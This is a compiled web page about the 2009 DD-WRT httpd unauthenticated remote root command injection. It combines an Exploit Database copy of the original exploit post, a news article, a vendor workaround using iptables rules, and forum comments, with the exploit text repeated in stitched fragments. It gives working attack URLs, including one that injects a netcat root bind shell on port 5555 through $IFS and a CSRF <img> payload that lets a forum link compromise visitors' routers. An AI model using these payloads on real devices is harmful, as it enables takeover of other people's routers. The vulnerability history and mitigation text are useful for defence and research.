**Vulnerable App:**

```
This is a remote root vulnerability in DD-WRT's httpd server. The bug exists
at the latest 24 sp1 version of the firmware.

 The problem is due to many bugs and bad software design decisions. Here is
part of httpd.c:

859 	        if (containsstring(file, "cgi-bin")) {
860
861 	                auth_fail = 0;
862 	                if (!do_auth
863 	                    (conn_fp, auth_userid, auth_passwd, auth_realm,
864 	                     authorization, auth_check))
865 	                        auth_fail = 1;

......... (snip)............

899
900 	                }
901 	                exec = fopen("/tmp/exec.tmp", "wb");
902 	                fprintf(exec, "export REQUEST_METHOD=\"%s\"\n", method);
903 	                if (query)
904 	                        fprintf(exec, "/bin/sh %s/%s</tmp/exec.query\n",
905 	                                server_dir != NULL ?
server_dir : "/www",file);
906 	                else
907 	                        fprintf(exec, "/%s/%s\n",
908 	                                server_dir != NULL ? server_dir : "/www",
file);
909 	                fclose(exec);
910
911 	                if (query) {
912 	                        exec = fopen("/tmp/exec.query", "wb");
913 	                        fprintf(exec, "%s\n", query);

........................
Two issues there:
1) No metacharacters handling
2) Command gets executed even without successful authentication.
You are not going to see any output if not authenticated though.
.......................

914 	                        free(query);
915 	                        fclose(exec);
916 	                }
917
918 	                system2("chmod 700 /tmp/exec.tmp");
919 	                system2("/tmp/exec.tmp>/tmp/shellout.asp");

........... (snip)..........

926 	                if (auth_fail == 1) {
927 	                        send_authenticate(auth_realm);
928 	                        auth_fail = 0;

------------

3) issue 3: httpd runs as root  :)

Now let's sum up (1), (2) and (3). Any unauthenticated attacker that can
connect to the management web interface can get easily root on the device via
his browser with an URL like:

 http://routerIP/cgi-bin/;command_to_execute

There is a catch though: whitespaces break it. Anyway, they can be easily
replaced with shell variable like $IFS. So, getting root shell at 5555/tcp
becomes as easy as typing this in your browser's url bar:

http://routerIP/cgi-bin/;nc$IFS-l$IFS-p$IFS\5555$IFS-e$IFS/bin/sh

Voila (pretty old-school, eheh). Here is some (poor) video demonstrating the
problem:
http://www.youtube.com/watch?v=UhDcXCVFrvM

Fortunately, httpd by default does not listen on the outbound interface.
However, this vulnerability can be exploited via a CSRF attack (the dd-wrt
device's owner does not even need to have an authenticated session on the web
UI which is bad, bad). However, a base authentication dialog will appear. In
IE even this can be supressed, see this one:

http://ha.ckers.org/blog/20090630/csrf-and-ignoring-basicdigest-auth/

Unlike the already documented CSRF vulnerability (
https://www.securityfocus.com/bid/32703 ) this DOES NOT need an authenticated
session. This means someone can even post some crafted [img] link on a forum
and a dd-wrt router owner visiting the forum will get owned  :)

A weird vulnerability you're unlikely to see in 2009  :)  Quite embarrassing I
would say  :)

Thanks krassyo at krassyo.info for his support  :)

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

A hacker has discovered a critical vulnerability in open-source firmware available for wireless routers made by Linksys and other manufacturers that allows attackers to remotely penetrate the device and take full control of it.

The remote root vulnerability affects the most recent version of DD-WRT, a piece of firmware many router users install to give their device capabilities not available by default. The bug allows unauthenticated users to remotely gain root access simply by luring someone on the local network to a malicious website.

"This means someone can even post some crafted [img] link on a forum and a dd-wrt router owner visiting the forum will get owned," a user named Leka Vecher "gat3way" wrote in [this posting](http://www.milw0rm.com/exploits/9209) to Milw0rm. "A weird vulnerability you're unlikely to see in 2009 :) Quite embarrassing I would say."

Messages sent through the DD-WRT website to the software designers weren't returned by time of publication, but comments posted to [this user forum thread](http://www.dd-wrt.com/phpBB2/viewtopic.php?t=55173&postdays=0&postorder=asc&start=0) said the vulnerability affected the most recent builds, prompting a user by the name of autobot to declare the vulnerability a "mini code red."

The bug resides in DD-WRT's hyper text transfer protocol daemon, which runs as root. Because the httpd doesn't sanitize user-supplied input, it's vulnerable to remote command injection. While the httpd doesn't listen on the outbound interface, attackers can easily access it using CSRF (cross-site request forgery) techniques.

What's more, exploits need not be part of an authenticated session, making them easy to carry out. Examples of URLs that allow remote takeover include:

```

http://routerIP/cgi-bin/;command_to_execute

```

or even:

```

<img src="https://192.168.0.1/cgi-bin/;CMD" alt="">

```

DD-WRT is open-source firmware that runs more than 200 different models of wireless routers and embedded devices, including those made Linksys, D-Link, Buffalo, and Netgear. If you don't know whether your device uses it, chances are it does not. Penetration testers using the Metasploit project can download [this module](http://trac.metasploit.com/changeset/6852) to audit whether a particular piece of hardware is vulnerable.

Additional details about the bug are [here](http://www.securityfocus.com/bid/35742/info) and [here](http://pastie.org/553314). ®

### Update

DD-WRT developer Sebastian Gottschall just emailed to say an interim fix is available [here](http://www.dd-wrt.com/dd-wrtv2/down.php?path=downloads%2Fothers%2Feko%2FBrainSlayer-V24-preSP2%2F07-21-09-r12533/). "Consider that this exploit was released without any Report to us," he added.

A DD-WRT representative also says attacks exploiting the vulnerability can be prevented without updating the firmware by adding a firewall rule. Here's how:

Go to your router, "Administration", "Commands" and enter the follwing text:

insmod ipt\_webstr

iptables -I INPUT -p tcp -m tcp -m webstr --url cgi-bin -j REJECT --reject-with tcp-reset

[![](https://pubads.g.doubleclick.net/gampad/ad?co=1&iu=/6978/reg_security/front&sz=300x50%7C300x100%7C300x250%7C300x251%7C300x252%7C300x600%7C300x601&tile=3&c=33Z5S9OvUkJZjo34YU3DqELgAAAUw&t=ct%3Dns%26unitnum%3D3%26raptor%3Deagle%26pos%3Dmid%26test%3D0)](https://pubads.g.doubleclick.net/gampad/jump?co=1&iu=/6978/reg_security/front&sz=300x50%7C300x100%7C300x250%7C300x251%7C300x252%7C300x600%7C300x601&tile=3&c=33Z5S9OvUkJZjo34YU3DqELgAAAUw&t=ct%3Dns%26unitnum%3D3%26raptor%3Deagle%26pos%3Dmid%26test%3D0)

and press "Save Firewall", then reboot your router.

This rule blocks any try to access sth that has "cgi-bin" in the URL.

You can prove that the rule works by entering: http://192.168.1.1/cgi-bin/;reboot in your browser. That should give a "Connection was reset" (Firefox).

Important Note: this does not work, if https management is turned on.

You need to turn off https management. If you don't want to do that, PLEASE UPDATE.

Go to your router, "Administration", "Commands" and enter the follwing text:   insmod ipt\_webstr  ln -s /dev/null /tmp/exec.tmp  iptables -D INPUT -p tcp -m tcp -m webstr --url cgi-bin -j REJECT --reject-with tcp-reset  iptables -I INPUT -p tcp -m tcp -m webstr --url cgi-bin -j REJECT --reject-with tcp-reset   and press "Save Firewall", then reboot your router.   This rule blocks any try to access sth that has "cgi-bin" in the url.   You can proove, that the rule works by entering: <http://192.168.1.1/cgi-bin/;reboot> in your browser. That should give a "Connection was reset" (Firefox).   Important Note: this does not work, if https managment is turned on.   You need to turn off https managment. If you don't want to do that, PLEASE UPDATE.\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_NewMedia-NET GmbH  Christian Scheele (CEO)  <http://www.dd-wrt.com>Last edited by chris on Thu Jul 23, 2009 13:24; edited 5 times in total | | |

The bug exists  at the latest 24 sp1 version of the firmware.   The problem is due to many bugs and bad software design decisions. Here is  part of httpd.c:   859 if (containsstring(file, "cgi-bin")) {  860  861 auth\_fail = 0;  862 if (!do\_auth  863 (conn\_fp, auth\_userid, auth\_passwd, auth\_realm,  864 authorization, auth\_check))  865 auth\_fail = 1;    ......... (snip)............   899  900 }  901 exec = fopen("/tmp/exec.tmp", "wb");  902 fprintf(exec, "export REQUEST\_METHOD=\"%s\"\n", method);  903 if (query)  904 fprintf(exec, "/bin/sh %s/%s</tmp/exec.query\n",  905 server\_dir != NULL ?  server\_dir : "/www",file);  906 else  907 fprintf(exec, "/%s/%s\n",  908 server\_dir != NULL ? server\_dir : "/www",  file);  909 fclose(exec);  910  911 if (query) {  912 exec = fopen("/tmp/exec.query", "wb");  913 fprintf(exec, "%s\n", query);   ........................  Two issues there:  1) No metacharacters handling  2) Command gets executed even without successful authentication.  You are not going to see any output if not authenticated though.  .......................   914 free(query);  915 fclose(exec);  916 }  917  918 system2("chmod 700 /tmp/exec.tmp");  919 system2("/tmp/exec.tmp>/tmp/shellout.asp");   ........... (snip)..........   926 if (auth\_fail == 1) {  927 send\_authenticate(auth\_realm);  928 auth\_fail = 0;   ------------   3) issue 3: httpd runs as root Smile     Now let's sum up (1), (2) and (3). Any unauthenticated attacker that can  connect to the management web interface can get easily root on the device via  his browser with an URL like:   <http://routerIP/cgi-bin/;command_to_execute>   There is a catch though: whitespaces break it. Anyway, they can be easily  replaced with shell variable like $IFS. So, getting root shell at 5555/tcp  becomes as easy as typing this in your browser's url bar:   <http://routerIP/cgi-bin/;nc$IFS-l$IFS-p$IFS>\5555$IFS-e$IFS/bin/sh    Voila (pretty old-school, eheh). Here is some (poor) video demonstrating the  problem:  <http://www.youtube.com/watch?v=UhDcXCVFrvM>    Fortunately, httpd by default does not listen on the outbound interface.  However, this vulnerability can be exploited via a CSRF attack (the dd-wrt  device's owner does not even need to have an authenticated session on the web  UI which is bad, bad). However, a base authentication dialog will appear. In  IE even this can be supressed, see this one:   <http://ha.ckers.org/blog/20090630/csrf-and-ignoring-basicdigest-auth/>   Unlike the already documented CSRF vulnerability (  <http://www.securityfocus.com/bid/32703> ) this DOES NOT need an authenticated  session. This means someone can even post some crafted [img] link on a forum  and a dd-wrt router owner visiting the forum will get owned Smile    A weird vulnerability you're unlikely to see in 2009 Smile Quite embarrassing I  would say Smile    Thanks krassyo at krassyo.info for his support Smile    Leka vecher Smile   # milw0rm.com [2009-07-20]   source <http://milw0rm.org/exploits/9209> | | |

Then again, assuming I understand correctly, a malicious web page on the Internet could use a cross-site request forgery ([CSRF](http://en.wikipedia.org/wiki/Cross-site_request_forgery)) to get the user's browser load the page at 192.168.1.1 with a crafted URL to open up WAN access, at which point you're in trouble.   An authentication message may pop up, but the article points out that it can be suppressed in IE so the user would have no way of knowing they've been owned.   W | | |
